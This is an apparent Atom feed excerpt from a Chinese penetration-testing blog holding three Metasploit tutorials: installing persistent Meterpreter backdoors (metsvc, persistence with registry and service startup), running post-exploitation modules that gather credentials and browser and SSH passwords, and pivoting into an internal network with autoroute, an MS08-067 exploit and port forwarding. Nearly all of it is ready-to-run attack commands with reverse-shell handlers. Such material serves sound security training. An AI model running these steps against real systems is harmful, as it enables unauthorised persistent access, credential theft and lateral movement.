    <content type="html"><![CDATA[<h4 id="持久后门"><a href="#持久后门" class="headerlink" title="持久后门"></a><strong>持久后门</strong></h4><ul><li>利用漏洞取得的meterpreter shell 运行于内存中,重启失效</li><li>重复 exploit 漏洞可能造成服务崩溃</li><li>持久后门保证漏洞修复后仍可远程控制</li></ul><ol><li><p><strong>Meterpreter脚本实现的正向持久后门</strong> - 缺点是别人发现了该端口都可以连</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">run metsvc -A#删除 -r,安装并启动metsvc服务,默认31337端口</span><br><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set PAYLOAD windows&#x2F;metsvc_bind_tcp#使用metsvc payload模块连接</span><br><span class="line">set LPORT 31337</span><br><span class="line">set RHOST 1.1.1.1</span><br></pre></td></tr></table></figure></li><li><p><strong>Meterpreter脚本实现的反弹持久后门</strong></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">run persistence -h</span><br><span class="line">run persistence -X -i 10 -p 4444 -r 1.1.1.1#写入脚本和注册表启动项启动</span><br><span class="line">background</span><br><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 1.1.1.1</span><br><span class="line">set lport 4444</span><br><span class="line">set exitonsession false#持续侦听端口配置参数</span><br><span class="line">exploit -j -z</span><br><span class="line"></span><br><span class="line">#其它两个参数</span><br><span class="line">run persistence -U -i 20 -p 4444 -r 1.1.1.1</span><br><span class="line">run persistence -S -i 20 -p 4444 -r 1.1.1.1#-S 服务启动</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;持久后门&quot;&gt;&lt;a href=&quot;#持久后门&quot; class=&quot;headerlink&quot; title=&quot;持久后门&quot;&gt;&lt;/a&gt;&lt;strong&gt;持久后门&lt;/strong&gt;&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;利用漏洞取得的meterpreter shell 运行于内存中,重启失效&lt;/l
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞利用" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
      <category term="MSF" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/MSF/"/>
    
    
      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
    
      <category term="meterpreter" scheme="http://c.cat.plus/tags/meterpreter/"/>
    
      <category term="metsvc" scheme="http://c.cat.plus/tags/metsvc/"/>
    
      <category term="persistence" scheme="http://c.cat.plus/tags/persistence/"/>
    
      <category term="后门持久化" scheme="http://c.cat.plus/tags/%E5%90%8E%E9%97%A8%E6%8C%81%E4%B9%85%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>MsF后渗透测试阶段之meterpreter脚本及post模块</title>
    <link href="http://c.cat.plus/2016/03/15/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8Bmeterpreter%E8%84%9A%E6%9C%AC%E5%8F%8Apost%E6%A8%A1%E5%9D%97/"/>
    <id>http://c.cat.plus/2016/03/15/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8Bmeterpreter%E8%84%9A%E6%9C%AC%E5%8F%8Apost%E6%A8%A1%E5%9D%97/</id>
    <published>2016-03-15T10:35:18.000Z</published>
    <updated>2020-07-07T09:08:37.985Z</updated>
    
    <content type="html"><![CDATA[<h4 id="POST-模块-在已经取得meterpreter之后使用的模块"><a href="#POST-模块-在已经取得meterpreter之后使用的模块" class="headerlink" title="POST 模块(在已经取得meterpreter之后使用的模块)"></a><strong>POST 模块</strong>(在已经取得meterpreter之后使用的模块)</h4><p><strong>获取meterpreter</strong></p><pre><code>use exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 1.1.1.1set exitonsession false        #持续侦听端口配置参数exploit -j -z</code></pre><p><strong>常用POST模块</strong>    </p><pre><code>#在meterpreter下输入run按tab键会提示有大量POST模块和脚本run post/windows/gather/arp_scanner RHOSTS=2.1.1.0/24    #扫描目标网段run post/windows/gather/checkvm        #检查是否为虚拟机run post/windows/gather/credentials/credential_collector    #获取目标机器账号等身份认证信息run post/windows/gather/enum_applications        #获取目标机器安装的应用程序run post/windows/gather/enum_logged_on_users    #获取目标系统正在登录中的账号run post/windows/gather/enum_snmp                #查看目标系统是否开启snmp服务run post/multi/recon/local_exploit_suggester    #获取目标系统可用来本地提权的漏洞信息run post/windows/manage/delete_user USERNAME=yuanfh        #删除目标系统账号run post/multi/gather/env                #获取目标系统一些敏感信息run post/multi/gather/firefox_creds        #收集firefox浏览器保存的密码信息run post/multi/gather/ssh_creds            #获取本地保存的SSH身份验证信息,适用linuxrun post/multi/gather/check_malware REMOTEFILE=c:\\a.exe    #检查目标系统的某个程序是否为恶意程序</code></pre><h4 id="另一种运行POST模块的方法"><a href="#另一种运行POST模块的方法" class="headerlink" title="另一种运行POST模块的方法"></a><strong>另一种运行POST模块的方法</strong></h4><p><strong>自动执行meterpreter脚本</strong></p><pre><code>show advanced        #显示高级设置参数set AutoRunScript hostsedit -e 1.1.1.1,www.baidu.com    #进入meterpreter自动修改hosts文件set InitialAutoRunScript checkvm</code></pre><p><strong>利用高级设置参数自动执行POST模块</strong></p><pre><code>set InitialAutoRunScript migrate -n explorer.exe    #需先设置迁移目标用户权限的进程set AutoRunScript post/windows/gather/dumplinks        #再设置获取最近打开文档路径</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;POST-模块-在已经取得meterpreter之后使用的模块&quot;&gt;&lt;a href=&quot;#POST-模块-在已经取得meterpreter之后使用的模块&quot; class=&quot;headerlink&quot; title=&quot;POST 模块(在已经取得meterpreter之后使用的模
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞利用" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
      <category term="MSF" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/MSF/"/>
    
    
      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
    
      <category term="dumplinks" scheme="http://c.cat.plus/tags/dumplinks/"/>
    
      <category term="hosts编辑" scheme="http://c.cat.plus/tags/hosts%E7%BC%96%E8%BE%91/"/>
    
      <category term="meterpreter" scheme="http://c.cat.plus/tags/meterpreter/"/>
    
      <category term="迁移进程" scheme="http://c.cat.plus/tags/%E8%BF%81%E7%A7%BB%E8%BF%9B%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>MsF后渗透测试阶段之跳板利用及端口转发</title>
    <link href="http://c.cat.plus/2016/03/14/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8B%E8%B7%B3%E6%9D%BF%E5%88%A9%E7%94%A8%E5%8F%8A%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
    <id>http://c.cat.plus/2016/03/14/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8B%E8%B7%B3%E6%9D%BF%E5%88%A9%E7%94%A8%E5%8F%8A%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</id>
    <published>2016-03-14T14:25:16.000Z</published>
    <updated>2020-07-07T09:09:06.705Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Pivoting-跳板-枢纽-支点"><a href="#Pivoting-跳板-枢纽-支点" class="headerlink" title="Pivoting 跳板 / 枢纽 / 支点"></a><strong>Pivoting</strong> 跳板 / 枢纽 / 支点</h4><ul><li>利用已经控制的一台计算机作为入侵内网的跳板</li><li>在其他内网计算机看来访问全部来自于跳板机</li><li><code>run autoroute -s 1.1.1.0/24</code><br>  #不能访问外网的被攻击目标内网网段</li></ul><p><strong>自动路由 现实场景</strong></p><ul><li>利用win 7攻击内网XP(对比xp有无外网访问权的情况)</li><li>扫描内网辅助模块: <code>auxiliary/scanner/portscan/tcp</code></li></ul><pre><code>use auxiliary/scanner/portscan/tcpshow optionsset rhosts 2.1.1.0/24set ports 139,445exploitdb_nmap -sV -p 445 2.1.1.11use exploit/windows/smb/ms08_067_netapishow optionsset rhost 2.1.1.11        #设置目标内网被攻击IPset payload windows/meterpreter/reverse_tcpset lhost 2.1.1.10        #设置反弹连接IP为跳板机set target 34</code></pre><p><strong>Pivoting之端口转发Portfwd</strong></p><ul><li>利用已经被控计算机,在kali与被攻击目标之间实现端口转发</li><li>也需要在已有session的前提下进入meterpreter内使用  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">portfwd add -L LIP -l LPORT -r RIP -p RPORT#添加端口转发规则</span><br><span class="line">portfwd add -L 1.1.1.10 -l 445 -r 2.1.1.11 -p 3389</span><br><span class="line">portfwd list #查看已添加列表</span><br><span class="line">portfwd delete#删除某条规则</span><br><span class="line">portfwd flush#删除全部规则</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;Pivoting-跳板-枢纽-支点&quot;&gt;&lt;a href=&quot;#Pivoting-跳板-枢纽-支点&quot; class=&quot;headerlink&quot; title=&quot;Pivoting 跳板 / 枢纽 / 支点&quot;&gt;&lt;/a&gt;&lt;strong&gt;Pivoting&lt;/strong&gt; 跳板 / 
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞利用" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
      <category term="MSF" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/MSF/"/>
    
    
      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
    
      <category term="meterpreter" scheme="http://c.cat.plus/tags/meterpreter/"/>
    
      <category term="跳板机" scheme="http://c.cat.plus/tags/%E8%B7%B3%E6%9D%BF%E6%9C%BA/"/>
    
      <category term="portfwd" scheme="http://c.cat.plus/tags/portfwd/"/>
    
      <category term="autoroute" scheme="http://c.cat.plus/tags/autoroute/"/>
    
  </entry>
  
</feed>
